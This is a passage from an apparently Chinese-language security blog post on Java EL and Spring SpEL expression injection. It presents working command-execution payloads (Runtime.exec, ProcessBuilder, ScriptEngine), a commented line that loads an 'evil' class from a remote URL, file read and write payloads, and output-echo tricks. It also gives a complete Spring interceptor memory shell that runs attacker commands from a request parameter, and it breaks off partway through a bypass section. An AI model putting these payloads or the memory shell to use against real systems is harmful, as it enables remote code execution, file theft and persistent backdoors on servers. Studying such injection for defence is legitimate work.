例如,<code>$&#123;pageContext.response&#125;</code>为页面的响应对象赋值。</li></ul></li><li>请求相关的简易对象<ul><li>param：<code>$&#123;param.name&#125;</code>等同于<code>request.getParameter(name)</code>。</li><li>paramValues：与param类似，将请求参数映射到数组而非单个值，<code>$&#123;paramValues.name&#125;</code>等同于<code>request.getParamterValues(name)</code>。</li><li>header：<code>$&#123;header.name&#125;</code>等同于<code>request.getHeader(name)</code>。</li><li>headerValues：同上</li><li>cookie：将<code>cookie</code>名称映射到单个<code>cookie</code>对象. 向服务器发出的客户端请求可以获得一个或多个<code>cookie</code>. 表达式<code>$&#123;cookie.name.value&#125;</code>返回带有特定名称的第一个<code>cookie</code>值. 如果请求包含多个同名的<code>cookie</code>, 则应该使用<code>$&#123;headerValues.name&#125;</code>表达式。</li><li>initParam：将上下文初始化参数名称映射到单个值(通过调用<code>ServletContext.getInitparameter(String name)</code>获得)。</li></ul></li><li>Web 上下文、会话、请求、页面<ul><li>pageScope</li><li>requestScope</li><li>sessionScope</li><li>applicationScope</li></ul></li></ul><h2 id="EL注入"><a href="#EL注入" class="headerlink" title="EL注入"></a>EL注入</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span><br>$&#123;pageContext&#125;<br><br><span class="hljs-comment">//获取Web路径</span><br>$&#123;pageContext<span class="hljs-selector-class">.getSession</span>()<span class="hljs-selector-class">.getServletContext</span>()<span class="hljs-selector-class">.getClassLoader</span>()<span class="hljs-selector-class">.getResource</span>(<span class="hljs-string">&quot;&quot;</span>)&#125;<br><br><span class="hljs-comment">//文件头参数</span><br>$&#123;header&#125;<br><br><span class="hljs-comment">//获取webRoot</span><br>$&#123;applicationScope&#125;<br><br><span class="hljs-comment">//执行命令</span><br>$&#123;pageContext<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.getSession</span>()<span class="hljs-selector-class">.setAttribute</span>(<span class="hljs-string">&quot;a&quot;</span>,pageContext<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<span class="hljs-selector-class">.getMethod</span>(<span class="hljs-string">&quot;getRuntime&quot;</span>,null)<span class="hljs-selector-class">.invoke</span>(null,null)<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;calc&quot;</span>)<span class="hljs-selector-class">.getInputStream</span>())&#125;<br><br><span class="hljs-comment">//反射调用ScriptEngine</span><br>$&#123;<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>)<span class="hljs-selector-class">.newInstance</span>()<span class="hljs-selector-class">.getEngineByName</span>(<span class="hljs-string">&quot;JavaScript&quot;</span>)<span class="hljs-selector-class">.eval</span>(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><h2 id="SPEL注入"><a href="#SPEL注入" class="headerlink" title="SPEL注入"></a>SPEL注入</h2><p><code>Spring</code>表达式语言（简称<code>SpEl</code>）是一个支持查询和操作运行时对象导航图功能的强大的表达式语言. 它的语法类似于传统<code>EL</code>, 但提供额外的功能, 最出色的就是函数调用和简单字符串的模板函数.</p><p>尽管有其他可选的<code>Java</code>表达式语言, 如<code>OGNL</code>,<code>MVEL</code>,<code>JBoss EL</code>等等, 但<code>Spel</code>创建的初衷是了给<code>Spring</code>社区提供一种简单而高效的表达式语言, 一种可贯穿整个<code>Spring</code>产品组的语言, 这种语言的特性应基于<code>Spring</code>产品的需求而设计. 虽然<code>SpEL</code>引擎作为<code>Spring</code>组合里的表达式解析的基础, 但它不直接依赖于<code>Spring</code>, 可独立使用.</p><blockquote><p><code>SimpleEvaluationContext</code>: 针对不需要<code>SpEL</code>语言语法的全部范围并且应该受到有意限制的表达式类别, 公开<code>SpEL</code>语言特性和配置选项的子集.</p><p><code>StandardEvaluationContext</code>: 公开全套<code>SpEL</code>语言功能和配置选项, 可以使用它来指定默认的根对象并配置每个可用的评估相关策略.</p><p><code>SimpleEvaluationContext</code>旨在仅支持<code>SpEL</code>语言语法的一个子集, 不包括<code>Java</code>类型引用、构造函数和<code>bean</code>引用; 而<code>StandardEvaluationContext</code>是支持全部<code>SpEL</code>语法的，<strong>因此使用StandardEvaluationContext才会造成SPEL注入</strong>。</p></blockquote><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>SPEL使用<code>#&#123;&#125;</code>作为界定符，它有三种使用方式， 一种是在注解<code>@Value</code>中, 一种是<code>XML</code>配置, 最后一种是在代码块中使用<code>Expression</code>。下面</p><h4 id="注解-Value-用法"><a href="#注解-Value-用法" class="headerlink" title="注解 @Value 用法"></a>注解 @Value 用法</h4><p><code>@Value</code>能修饰成员变量和方法形参,<code>#&#123;&#125;</code>内就是<code>SpEL</code>表达式的语法,<code>Spring</code>会根据<code>SpEL</code>表达式语法为变量赋值.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-meta">@Value(&quot;$&#123; spring.user.name &#125;&quot;)</span><br>    <span class="hljs-keyword">private</span> String Username;<br>    <span class="hljs-meta">@Value(&quot;#&#123; systemProperties[&#x27;user.region&#x27;] &#125;&quot;)</span><br>    <span class="hljs-keyword">private</span> String defaultLocale;<br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="XML-配置用法"><a href="#XML-配置用法" class="headerlink" title="XML 配置用法"></a>XML 配置用法</h4><p>在<code>SpEL</code>表达式中, 使用<code>T(Type)</code>运算符会调用类的作用域和方法,<code>T(Type)</code>操作符会返回一个<code>object</code>, 它可以帮助获取某个类的静态方法, 用法<code>T(全限定类名).方法名()</code>, 即可以通过该类类型表达式来操作类, 例如:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.mi1k7ea.HelloWorld&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="Expression-用法"><a href="#Expression-用法" class="headerlink" title="Expression 用法"></a>Expression 用法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">spel</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;<br><span class="hljs-comment">// 1.创建解析器</span><br><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><span class="hljs-comment">// 2.解析表达式</span><br><span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(spel);<br><span class="hljs-comment">// 3.求值</span><br>System.out.println(expression.getValue());<br></code></pre></td></tr></table></figure><h3 id="类型表达式-T"><a href="#类型表达式-T" class="headerlink" title="类型表达式 T()"></a>类型表达式 T()</h3><p>在SpEL表达式中，使用<code>T(Type)</code>运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">cmdStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(java.lang.String)&quot;</span>;<br><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><span class="hljs-type">Expression</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> parser.parseExpression(cmdStr);<br>System.out.println(exp.getValue() );<br></code></pre></td></tr></table></figure><p>使用<code>T(Type)</code>来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，<strong>获取到类之后只能调用static方法，调用非static方法需要new</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>) <br>    <span class="hljs-comment">//yes</span><br>T(javax.script.ScriptEngineManager).getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;..&quot;</span>) <br>    <span class="hljs-comment">//no, getEngineByName() is not static  </span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.script.ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-comment">//yes</span><br></code></pre></td></tr></table></figure><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>在SpEL表达式中，变量定义通过EvaluationContext类的setVariable(variableName, value)函数来实现；在表达式中使用”#variableName”来引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象：</p><ul><li>#this：使用当前正在计算的上下文；</li><li>#root：引用容器的root对象；</li><li>@bean_name：引用Bean</li></ul><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Speli</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * direct RCE</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;<br><span class="hljs-comment">//        String exp = &quot;new java.lang.ProcessBuilder(new String[]&#123;\&quot;calc\&quot;&#125;).start()&quot;;</span><br><span class="hljs-comment">//        String exp = &quot;new javax.script.ScriptEngineManager().getEngineByName(\&quot;nashorn\&quot;).eval(\&quot;s=[1];s[0]=&#x27;calc&#x27;;java.lang.Runtime.getRuntime().exec(s);\&quot;)&quot;;</span><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * ClassLoader</span><br><span class="hljs-comment">         */</span><br><span class="hljs-comment">//        String exp = &quot;T(java.lang.ClassLoader).getSystemClassLoader().loadClass(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;;</span><br><span class="hljs-comment">// local</span><br><span class="hljs-comment">//        String exp = &quot;new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(&#x27;http://127.0.0.1:8888/&#x27;)&#125;).loadClass(\&quot;evil\&quot;).getConstructors()[0].newInstance()&quot;;</span><br><span class="hljs-comment">//remote</span><br>        <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">spelExpressionParser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> spelExpressionParser.parseExpression(exp);<br>        System.out.println(expression.getValue());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>还有一些其他获取到ClassLoader的方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#springboot</span><br>T(org.springframework.expression.Expression).getClass().getClassLoader()<br><span class="hljs-comment">#thymeleaf </span><br>T(org.thymeleaf.context.AbstractEngineContext).getClass().getClassLoader()<br><span class="hljs-comment">#web服务下通过内置对象</span><br>&#123;request.getClass().getClassLoader().loadClass(\&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;).invoke(null).<span class="hljs-built_in">exec</span>(\&quot;<span class="hljs-built_in">touch</span> /tmp/foobar\&quot;)&#125;<br></code></pre></td></tr></table></figure><h3 id="回显-amp-读写-amp-内存马"><a href="#回显-amp-读写-amp-内存马" class="headerlink" title="回显&amp;读写&amp;内存马"></a>回显&amp;读写&amp;内存马</h3><p>1.回显</p><p>回显方面考虑通用的思路，基于当前环境获取response对象，将result装进响应包的header、body等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//直接从上下文中获取response。</span><br>#response.addHeader(<span class="hljs-string">&#x27;x-echo&#x27;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>).start().getInputStream(), <span class="hljs-string">&quot;gbk&quot;</span>)).readLine())<br>    <br><span class="hljs-comment">//Scanner回显，会把结果都放在一行返回。</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;.\\&quot;</span>).start().getInputStream(), <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;asdasdasdasd&quot;</span>).next()<br>    <br><span class="hljs-comment">//commons-io回显</span><br> T(org.apache.commons.io.IOUtils).toString(payload).getInputStream())<br>    <br><span class="hljs-comment">//jshell回显 </span><br>T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(<span class="hljs-string">&quot;jdk.jshell.JShell&quot;</span>,<span class="hljs-literal">true</span>).Methods[<span class="hljs-number">6</span>].invoke(<span class="hljs-literal">null</span>,&#123;&#125;).eval(<span class="hljs-string">&#x27;whatever java code in one statement&#x27;</span>).toString()<br>    <br>    <br></code></pre></td></tr></table></figure><p>2.读写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//读文件</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get(T(java.net.URI).create(<span class="hljs-string">&quot;file:/C:/Users/helloworld/shell.jsp&quot;</span>))))<br><br><span class="hljs-comment">//写文件</span><br>T(java.nio.file.Files).write(T(java.nio.file.Paths).get(T(java.net.URI).create(<span class="hljs-string">&quot;file:/C:/Users/helloworld/shell.jsp&quot;</span>)), <span class="hljs-string">&#x27;FILE_CONTENT&#x27;</span>.getBytes(), T(java.nio.file.StandardOpenOption).WRITE)<br></code></pre></td></tr></table></figure><p>3.内存马</p><p>内存马方面以springboot interceptor为例，直接defineClass()加载即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="hljs-string">&#x27;Memshell&#x27;</span>,T(org.springframework.util.Base64Utils).decodeFromString(<span class="hljs-string">&#x27;yv66vgAAA....&#x27;</span>),<span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.management.loading.MLet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[<span class="hljs-number">0</span>],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()&#125;<br><br><span class="hljs-comment">//或者精简一下，第一种使用MLet，它继承于URLClassLoader，好处是可以加载任意远程或本地类。</span><br>#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="hljs-string">&#x27;InceptorMemShell&#x27;</span>,T(org.springframework.util.Base64Utils).decodeFromString(<span class="hljs-string">&#x27;...&#x27;</span>),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()&#125;<br></code></pre></td></tr></table></figure><p>下面是interceptor内存马：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InceptorMemShell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-type">InceptorMemShell</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InceptorMemShell</span>();<br>        adaptInterceptors.add(evilInterceptor);<br>        System.out.println(<span class="hljs-string">&quot;ok&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                response.setCharacterEncoding(<span class="hljs-string">&quot;gbk&quot;</span>);<br>                java.io.<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> response.getWriter();<br>                ProcessBuilder builder;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    builder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    builder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;);<br>                &#125;<br>                java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(builder.start().getInputStream(),<span class="hljs-string">&quot;gbk&quot;</span>).useDelimiter(<span class="hljs-string">&quot;wocaosinidema&quot;</span>);<br>                o = c.hasNext() ? c.next(): o;<br>                c.close();<br>                printWriter.println(o);<br>                printWriter.flush();<br>                printWriter.close();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.postHandle(request, response, handler, modelAndView);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.afterCompletion(request, response, handler, ex);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><h4 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">T(String).getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span 